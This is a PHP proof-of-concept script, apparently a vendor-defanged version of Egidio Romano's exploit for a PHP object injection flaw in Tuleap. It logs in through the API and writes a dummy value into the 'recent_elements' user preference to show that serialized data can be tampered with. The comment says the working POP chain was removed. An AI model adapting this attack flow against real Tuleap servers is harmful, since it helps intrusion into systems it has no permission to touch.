<?php

/**
 * Copyright (c) 2017 Egidio Romano from Karma(In)Security <http://karmainsecurity.com/>
 * Full workable POP chain removed by Thomas Gerbet (Enalean)
 */

error_reporting(E_ERROR);
set_time_limit(0);

if ($argc < 5)
{
	print "\nUsage......: php $argv[0] <host> <path> <username> <password>\n";
	print "\nExample....: php $argv[0] demo.tuleap.org / user passwd";
	print "\nExample....: php $argv[0] 127.0.0.1 /tuleap/ admin passwd\n";
	die();
}

list($host, $path, $user, $pass) = array($argv[1], $argv[2], $argv[3], $argv[4]);

print "[-] Getting API token using username '{$user}' and password '{$pass}'\n";

$payload = json_encode(array("username" => $user, "password" => $pass));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://{$host}{$path}api/tokens");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json"));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

$result = json_decode(curl_exec($ch));

if (!$result or !isset($result->user_id)) die("[-] API authentication failed!\n");

print "[-] We're in! Updating user preference for Object Injection attack...\n";

$uid = $result->user_id;
$tok = $result->token;

$headers = array("Content-Type: application/json", "X-Auth-Token: {$tok}", "X-Auth-UserId: {$uid}");
$payload = json_encode(array("id" => $uid, "preference" => array("key" => "recent_elements", "value" => 'BrokeUnserialize')));

curl_setopt($ch, CURLOPT_URL, "https://{$host}{$path}api/users/{$uid}/preferences");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PATCH");
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

if (!is_string($result) or strlen($result) != 0) die("[-] Error while setting user preference...\n");
else print "[-] Done! Now go to https://{$host}{$path}plugins/tracker/?aid=[VALID_ID]\nYou will get a notice when accessing the page showing that serialized can me manipulated by a user.";
